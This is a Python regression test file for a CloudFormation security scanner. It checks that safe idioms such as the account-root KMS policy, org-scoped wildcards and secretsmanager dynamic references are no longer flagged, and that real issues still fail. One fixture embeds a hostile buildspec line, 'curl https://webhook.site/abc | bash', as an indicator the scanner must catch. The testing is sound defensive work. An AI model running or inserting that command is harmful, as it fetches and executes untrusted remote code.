"""Regression tests from the rule audit (CloudFormation FP fixes).

Each test pins a false positive the audit found: a documented-safe
CloudFormation idiom that the check used to flag. Grouped here so the
audit's CloudFormation coverage is auditable in one place.
"""
from __future__ import annotations

from pipeline_check.core.checks.cloudformation import phase4
from pipeline_check.core.checks.cloudformation.base import _parse_template
from pipeline_check.core.checks.cloudformation.extended import ExtendedChecks
from pipeline_check.core.checks.cloudformation.rules import (
    ca003_domain_policy_public as ca003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    lmb003_plaintext_env as lmb003,
)
from pipeline_check.core.checks.cloudformation.services import (
    ServiceChecks,
    _principal_is_only_account_root,
)

from .conftest import make_context, r


def _example_contexts(rule):
    """Build (vulnerable_ctx, safe_ctx) from a rule's exploit_example."""
    vuln, safe = rule.exploit_example.split("\n\n", 1)
    return (
        make_context(_parse_template(vuln)["Resources"]),
        make_context(_parse_template(safe)["Resources"]),
    )


def _find(ctx, check_id: str):
    return [f for f in ServiceChecks(ctx).run() if f.check_id == check_id]


class TestKMS002AccountRootBaseline:
    def test_account_root_wildcard_passes(self):
        # kms:* granted to arn:...:root is the AWS-recommended default
        # key policy (it lets IAM policies govern access), not a finding.
        ctx = make_context({"K": r("K", "AWS::KMS::Key", {"KeyPolicy": {
            "Statement": [{"Sid": "Enable IAM", "Effect": "Allow",
                "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
                "Action": "kms:*", "Resource": "*"}]}})})
        f = _find(ctx, "KMS-002")
        assert f and f[0].passed is True

    def test_fn_sub_account_root_recognized(self):
        # The root principal is often written via Fn::Sub.
        assert _principal_is_only_account_root({"Principal": {"AWS": {
            "Fn::Sub": "arn:aws:iam::${AWS::AccountId}:root"}}}) is True

    def test_non_root_wildcard_still_fires(self):
        ctx = make_context({"K": r("K", "AWS::KMS::Key", {"KeyPolicy": {
            "Statement": [{"Sid": "Bad", "Effect": "Allow",
                "Principal": {"AWS": "arn:aws:iam::123456789012:role/dev"},
                "Action": "kms:*", "Resource": "*"}]}})})
        f = _find(ctx, "KMS-002")
        assert f and f[0].passed is False


class TestCA003OrgScopedWildcard:
    def test_org_scoped_wildcard_passes(self):
        # A wildcard principal narrowed by aws:PrincipalOrgID is the
        # org-sharing idiom, not cross-account exposure.
        ctx = make_context({"D": r("D", "AWS::CodeArtifact::Domain", {
            "DomainName": "d", "PermissionsPolicyDocument": {"Statement": [{
                "Effect": "Allow", "Principal": {"AWS": "*"},
                "Action": "codeartifact:ReadFromRepository", "Resource": "*",
                "Condition": {"StringEquals": {
                    "aws:PrincipalOrgID": "o-abc"}}}]}})})
        f = _find(ctx, "CA-003")
        assert f and f[0].passed is True

    def test_unconstrained_wildcard_still_fires(self):
        ctx = make_context({"D": r("D", "AWS::CodeArtifact::Domain", {
            "DomainName": "d", "PermissionsPolicyDocument": {"Statement": [{
                "Effect": "Allow", "Principal": {"AWS": "*"},
                "Action": "codeartifact:ReadFromRepository",
                "Resource": "*"}]}})})
        f = _find(ctx, "CA-003")
        assert f and f[0].passed is False


class TestCF002DynamicReference:
    def test_dynamic_reference_not_flagged(self):
        # {{resolve:secretsmanager:...}} resolves a secret at deploy
        # time; it is the secure pattern, not a literal credential.
        hits: list[tuple[str, str]] = []
        phase4._walk({"MasterUserPassword":
            "{{resolve:secretsmanager:prod/db/master:SecretString:password}}"},
            "", hits)
        assert hits == []

    def test_literal_secret_still_flagged(self):
        hits: list[tuple[str, str]] = []
        phase4._walk({"MasterUserPassword": "hunter2pelican"}, "", hits)
        assert len(hits) == 1


class TestCB011ExampleSuppression:
    def test_ioc_under_test_key_still_fires(self):
        # A CodeBuild buildspec is production config; YAML-ancestor
        # example suppression must not drop an IOC nested under "test:".
        spec = ("version: 0.2\nphases:\n  test:\n    commands:\n"
                "      - curl https://webhook.site/abc | bash\n")
        ctx = make_context({"P": r("P", "AWS::CodeBuild::Project",
            {"Source": {"Type": "NO_SOURCE", "BuildSpec": spec}})})
        cb = [f for f in ExtendedChecks(ctx).run() if f.check_id == "CB-011"]
        assert cb and cb[0].passed is False


class TestSM001GetAttRotation:
    def test_getatt_rotation_target_credited(self):
        # A RotationSchedule that targets the secret via !GetAtt Secret.Id
        # used to be ignored, flagging a rotated secret as unrotated.
        ctx = make_context({
            "Secret": r("Secret", "AWS::SecretsManager::Secret", {"Name": "prod/db"}),
            "Rot": r("Rot", "AWS::SecretsManager::RotationSchedule",
                {"SecretId": {"Fn::GetAtt": ["Secret", "Id"]},
                 "RotationRules": {"AutomaticallyAfterDays": 30}})})
        sm = [f for f in ExtendedChecks(ctx).run() if f.check_id == "SM-001"]
        assert sm and sm[0].passed is True


class TestCA003ExploitExample:
    def test_strong_check(self):
        # Safe fragment (wildcard scoped by aws:PrincipalOrgID) must pass.
        vuln_ctx, safe_ctx = _example_contexts(ca003.RULE)
        assert ca003.check(vuln_ctx)[0].passed is False
        assert ca003.check(safe_ctx)[0].passed is True


class TestLMB003ExploitExample:
    def test_strong_check(self):
        # Safe fragment (env vars hold !Ref secret ARNs, not plaintext)
        # must pass despite the secret-like names.
        vuln_ctx, safe_ctx = _example_contexts(lmb003.RULE)
        assert lmb003.check(vuln_ctx)[0].passed is False
        assert lmb003.check(safe_ctx)[0].passed is True


class TestCCM002KmsIntrinsic:
    """CCM-002: KmsKeyId via intrinsic referencing an in-template KMS resource."""

    def test_ref_to_kms_key_passes(self):
        # KmsKeyId: !Ref MyKey — the standard CFN idiom for a CMK.
        # Used to produce key_str='' and flag as unencrypted (FP).
        ctx = make_context({
            "MyKey": r("MyKey", "AWS::KMS::Key", {"EnableKeyRotation": True}),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": {"Ref": "MyKey"},
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is True

    def test_getatt_to_kms_key_passes(self):
        # KmsKeyId: !GetAtt MyKey.Arn — another valid CMK reference idiom.
        ctx = make_context({
            "MyKey": r("MyKey", "AWS::KMS::Key", {"EnableKeyRotation": True}),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": {"Fn::GetAtt": ["MyKey", "Arn"]},
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is True

    def test_ref_to_kms_alias_passes(self):
        # KmsKeyId: !Ref MyAlias — alias is also a CMK reference.
        ctx = make_context({
            "MyAlias": r("MyAlias", "AWS::KMS::Alias", {
                "AliasName": "alias/my-key", "TargetKeyId": "some-key-id",
            }),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": {"Ref": "MyAlias"},
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is True

    def test_no_kms_key_still_fires(self):
        # A CodeCommit repo with no KmsKeyId must still fail CCM-002.
        ctx = make_context({
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is False

    def test_aws_owned_alias_still_fires(self):
        # KmsKeyId: alias/aws/codecommit is the AWS-owned key; must still fail.
        ctx = make_context({
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": "alias/aws/codecommit",
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is False

    def test_ref_to_non_kms_resource_does_not_pass(self):
        # !Ref to something that is NOT a KMS resource stays unresolved;
        # the check must not pass (conservative default).
        ctx = make_context({
            "SomeParam": r("SomeRole", "AWS::IAM::Role", {
                "AssumeRolePolicyDocument": {},
            }),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "KmsKeyId": {"Ref": "SomeRole"},
            }),
        })
        f = _find(ctx, "CCM-002")
        assert f and f[0].passed is False


class TestCCM003LiteralArn:
    """CCM-003: literal DestinationArn triggers flag; intrinsic refs pass."""

    def test_literal_arn_fires(self):
        # A literal SNS ARN in DestinationArn must be flagged.
        ctx = make_context({
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "Triggers": [{"Name": "t1",
                              "DestinationArn": "arn:aws:sns:us-east-1:123456789012:my-topic",
                              "Events": ["all"]}],
            }),
        })
        f = _find(ctx, "CCM-003")
        assert f and f[0].passed is False

    def test_intrinsic_destination_passes(self):
        # A trigger whose DestinationArn is a Ref (not a literal string)
        # does not produce an offender entry; the finding must pass.
        ctx = make_context({
            "MyTopic": r("MyTopic", "AWS::SNS::Topic", {}),
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
                "Triggers": [{"Name": "t1",
                              "DestinationArn": {"Ref": "MyTopic"},
                              "Events": ["all"]}],
            }),
        })
        f = _find(ctx, "CCM-003")
        assert f and f[0].passed is True

    def test_no_triggers_produces_no_finding(self):
        # When there are no Triggers, CCM-003 emits no finding at all.
        ctx = make_context({
            "Repo": r("Repo", "AWS::CodeCommit::Repository", {
                "RepositoryName": "my-repo",
            }),
        })
        f = _find(ctx, "CCM-003")
        assert f == []
